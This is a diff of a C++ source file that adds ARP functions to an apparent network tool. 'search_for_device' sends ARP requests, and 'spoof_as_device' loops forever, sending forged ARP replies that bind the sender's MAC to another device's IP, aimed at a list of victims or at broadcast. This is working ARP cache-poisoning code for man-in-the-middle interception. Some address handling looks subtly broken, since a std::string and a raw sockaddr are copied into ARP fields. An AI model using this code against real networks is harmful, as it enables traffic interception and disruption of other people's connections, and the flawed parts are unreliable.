@@ -7,6 +7,7 @@
 #include <netinet/if_ether.h>
 #include <linux/if.h>
 #include <sys/ioctl.h>
+#include <thread>
 
 using namespace std;
 
@@ -39,50 +40,91 @@ void arp_conn_client::finish() {
 //    close(fd);
 }
 
-void arp_conn_client::spoof(const string &spoofed_mac, const string &ip, const string &device_mac) {
+#define IP4LEN 4
+mac_addr arp_conn_client::search_for_device(std::string priv_ip) {
+    struct mac_addr my_mac = get_my_mac_address("enp0s3");
+    struct sockaddr my_ip = ether_client->my_priv_ip.ifr_addr;
+
+
+#define BUFF_LEN 512
+    char buff[BUFF_LEN];
+    memset(buff, 0, BUFF_LEN);
+
+
+    // setup arp
+    struct ether_arp *arp_header = (struct ether_arp *) buff; // arp_header header
+    arp_header->arp_hrd = htons(ARPHRD_ETHER); // first arp addr type: mac
+    arp_header->arp_pro = htons(ETH_P_IP); // first arp addr type: ip
+    arp_header->arp_hln = ETH_ALEN; // len of mac addr
+    arp_header->arp_pln = IP4LEN; // len of ip addr
+    arp_header->arp_op = htons(ARPOP_REQUEST); // type of arp (request)
+
+    memcpy(arp_header->arp_sha, &my_mac, sizeof(arp_header->arp_sha)); // my spoofed mac addr
+    memcpy(arp_header->arp_spa, &my_ip, sizeof(arp_header->arp_spa)); // device ip
+
+    memset(arp_header->arp_tha, 0, sizeof(arp_header->arp_tha));
+    memcpy(arp_header->arp_tpa, &priv_ip, sizeof(arp_header->arp_tpa));
+
+
+    ether_client->change_dest_mac(BROADCAST_MAC);
+    ether_client->send_next_prot_msg(htons(ETH_P_ARP), buff, sizeof(ether_arp));
 
 }
 
-//void arp_conn_client::discover(const std::string ip) {
+void arp_conn_client::spoof_as_device(std::string device,
+                                      std::vector<std::pair<mac_addr, std::string>>& victim_devices) {
 
-//
-//#define PACKET_LEN 256
-//    char packet[PACKET_LEN];
-//    struct iphdr *iph = (struct iphdr *)packet;
-//
-//    char *data = packet + sizeof(struct iphdr);
-////    strcpy(data, "Hello, this is raw data from the client.");
-//    memcpy(data, buff, count);
-//
-//    iph->ihl = 5;
-//    iph->version = 4;
-//    iph->tos = 0;
-//    iph->tot_len = sizeof(struct iphdr) + count;
-//    iph->id = htonl(4444);
-//    iph->frag_off = 0;
-//    iph->ttl = 255;
-//    iph->protocol = prot;
-//    iph->check = 0;
-//    iph->saddr = 0; // Set source IP to 0 for the kernel to fill it automatically
-//    iph->daddr = dest_addr.sin_addr.s_addr;
-//
-//    iph->check = checksum((unsigned short *)packet, iph->tot_len >> 1);
-//
-//    return sendto(fd, packet, iph->tot_len, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+//    struct mac_addr my_mac = ether_client->my_mac;
+    struct mac_addr my_mac = get_my_mac_address("enp0s3");
+    struct in_addr device_ip = {0};
+    if (!inet_aton(device.c_str(), &device_ip))
+        throw "can't convert device's ip";
 
 
-//#define PACKET_LEN 50
-//    char packet[PACKET_LEN];
-//
-//    socklen_t sock_len = sizeof(dest_addr);
-//
-//    int res = recvfrom(fd, packet, PACKET_LEN, 0, (struct sockaddr *)&dest_addr, &sock_len);
-//
-//    char *data = packet + sizeof(struct iphdr);
-//    int data_cnt = std::min((int) (res - sizeof(struct iphdr)), count);
-//
-//    memcpy(buff, data, data_cnt);
-//    return data_cnt;
+#define BUFF_LEN 512
+    char buff[BUFF_LEN];
+    memset(buff, 0, BUFF_LEN);
 
-//}
+
+    // setup arp
+    struct ether_arp *arp_header = (struct ether_arp *) buff; // arp_header header
+    arp_header->arp_hrd = htons(ARPHRD_ETHER); // first arp addr type: mac
+    arp_header->arp_pro = htons(ETH_P_IP); // first arp addr type: ip
+    arp_header->arp_hln = ETH_ALEN; // len of mac addr
+    arp_header->arp_pln = IP4LEN; // len of ip addr
+    arp_header->arp_op = htons(ARPOP_REPLY); // type of arp (forged reply)
+
+    memcpy(arp_header->arp_sha, &my_mac, sizeof(arp_header->arp_sha)); // my spoofed mac addr
+    memcpy(arp_header->arp_spa, &device_ip, sizeof(arp_header->arp_spa)); // device ip
+
+    while (true) {
+        using namespace std::chrono_literals;
+        std::this_thread::sleep_for(500ms);
+
+        if (victim_devices.empty()) { // spoof whole broadcast
+            memset(arp_header->arp_tha, 0xff, ETH_ALEN);
+            memset(arp_header->arp_tpa, 0x00, IP4LEN);
+
+            ether_client->change_dest_mac(BROADCAST_MAC);
+            ether_client->send_next_prot_msg(htons(ETH_P_ARP), buff, sizeof(ether_arp));
+
+        } else { // spoof every victim
+            for (pair<mac_addr, string> &victim: victim_devices) {
+                mac_addr victim_mac = victim.first;
+                struct in_addr victim_ip = {0};
+                if (!inet_aton(victim.second.c_str(), &victim_ip))
+                    throw "can't convert civtim's ip";
+
+                // send to specific device
+                memcpy(arp_header->arp_tha, &victim_mac, sizeof(arp_header->arp_tha));
+                memcpy(arp_header->arp_tpa, &victim_ip, sizeof(arp_header->arp_tpa));
+
+                ether_client->change_dest_mac(victim_mac);
+                ether_client->send_next_prot_msg(htons(ETH_P_ARP), buff, sizeof(ether_arp));
+            }
+
+        }
+    }
+
+}
 
